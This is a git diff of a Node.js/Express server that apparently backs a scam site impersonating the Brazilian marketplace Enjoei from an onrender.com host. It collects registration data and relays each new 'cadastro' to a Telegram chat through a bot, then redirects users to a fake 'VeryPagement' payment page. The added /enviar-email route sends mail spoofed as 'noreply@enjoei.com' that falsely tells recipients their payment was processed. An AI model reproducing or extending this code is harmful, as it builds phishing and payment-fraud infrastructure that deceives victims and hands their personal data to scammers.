@@ -17,21 +17,31 @@ for (const envVar of requiredEnvVars) {
   }
 }
 
-// Configuração de CORS para permitir o domínio específico
+// Configuração de CORS
 const corsOptions = {
-  origin: 'https://enjoei-5e5r.onrender.com', // URL do seu frontend
-  methods: ['GET', 'POST'],
+  origin: [
+    'https://enjoei-5e5r.onrender.com',
+    'http://localhost:3000',
+    'http://localhost:5500',
+    'http://127.0.0.1:5500', // Para Live Server
+    'http://localhost:8080', // Outras portas comuns
+  ],
+  methods: ['GET', 'POST', 'OPTIONS'], // Inclui OPTIONS para requisições preflight
   allowedHeaders: ['Content-Type', 'Authorization'],
+  credentials: true, // Se necessário para cookies
 };
 
-app.use(cors(corsOptions)); // Definindo CORS
+app.use(cors(corsOptions));
 
-// Página inicial
+// Middleware
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Rotas HTML
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
 });
 
-// Rotas HTML
 app.get('/acesso', (req, res) => {
   res.sendFile(path.join(__dirname, 'acesso', 'index.html'));
 });
@@ -70,9 +80,9 @@ app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
 app.use('/very', express.static(path.join(__dirname, 'very')));
 app.use('/img', express.static(path.join(__dirname, 'img')));
 app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
-app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement'))); // Adicione esta linha
+app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
 
-// Telegram Bot - Configuração melhorada
+// Telegram Bot
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
 let CHAT_ID = null;
@@ -93,9 +103,9 @@ function startBotPolling() {
         autoStart: true,
         params: {
           timeout: 10,
-          drop_pending_updates: true
-        }
-      }
+          drop_pending_updates: true,
+        },
+      },
     });
 
     bot.on('message', (msg) => {
@@ -108,7 +118,6 @@ function startBotPolling() {
     bot.on('polling_error', (error) => {
       console.error('Erro no polling do Telegram:', error.message);
       isPollingActive = false;
-      // Reinicia o polling após 5 segundos
       setTimeout(startBotPolling, 5000);
     });
 
@@ -120,12 +129,7 @@ function startBotPolling() {
   }
 }
 
-// Inicia o bot
 startBotPolling();
-
-// Middleware
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
 // Configuração de e-mail
 const transporter = nodemailer.createTransport({
@@ -136,7 +140,7 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// Enviar e-mail
+// Enviar e-mail para cadastro
 async function sendConfirmationEmail(cliente, emailDestino) {
   if (!emailDestino) {
     console.warn('Email não fornecido, pulando envio.');
@@ -188,10 +192,8 @@ app.post('/api/clients', (req, res) => {
     data_cadastro: new Date().toISOString(),
   };
 
-  // Enviar e-mail de confirmação
   sendConfirmationEmail(cliente, email);
 
-  // Enviar para o Telegram
   if (CHAT_ID && bot) {
     const msg = `✨ *Novo Cadastro Recebido!* ✨
 
@@ -207,12 +209,50 @@ app.post('/api/clients', (req, res) => {
 
     bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' })
       .then(() => console.log('Mensagem enviada para o Telegram'))
-      .catch(error => console.error('Erro ao enviar mensagem para o Telegram:', error.message));
+      .catch((error) => console.error('Erro ao enviar mensagem para o Telegram:', error.message));
   } else {
     console.warn('CHAT_ID não definido ou bot não inicializado. Mensagem não enviada.');
   }
 
   res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
+});
+
+// Rota para enviar e-mail
+app.post('/enviar-email', async (req, res) => {
+  console.log('Requisição recebida em /enviar-email:', req.body); // Log para depuração
+  const { email } = req.body;
+
+  if (!email) {
+    return res.status(400).json({ error: 'E-mail é obrigatório' });
+  }
+
+  const mailOptions = {
+    from: 'Enjoei <noreply@enjoei.com>',
+    to: email,
+    subject: 'Confirmação de Pagamento',
+    html: `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
+        <h1 style="color: #61005D;">Confirmação de Pagamento</h1>
+        <p>Olá,</p>
+        <p>Seu pagamento foi processado com sucesso. Em breve, o valor será creditado em sua conta.</p>
+        <p>Atenciosamente,<br>Equipe Enjoei</p>
+      </div>
+    `,
+  };
+
+  try {
+    await transporter.sendMail(mailOptions);
+    console.log('E-mail enviado para:', email);
+    res.status(200).send('E-mail enviado com sucesso!');
+  } catch (error) {
+    console.error('Erro ao enviar e-mail:', error);
+    res.status(500).send('Erro ao enviar e-mail: ' + error.message);
+  }
+});
+
+// Rota de teste para verificar o servidor
+app.get('/test', (req, res) => {
+  res.send('Servidor está funcionando!');
 });
 
 // Fallback para frontend
@@ -231,21 +271,20 @@ const server = app.listen(PORT, () => {
 // Gerenciamento de encerramento
 function gracefulShutdown() {
   console.log('Encerrando servidor...');
-  
+
   if (bot && isPollingActive) {
     bot.stopPolling();
     console.log('Polling do Telegram encerrado.');
   }
-  
+
   transporter.close();
   console.log('Conexão do Nodemailer encerrada.');
-  
+
   server.close(() => {
     console.log('Servidor HTTP encerrado.');
     process.exit(0);
   });
 
-  // Força encerramento após 5 segundos se não concluir
   setTimeout(() => {
     console.error('Encerramento forçado após timeout');
     process.exit(1);
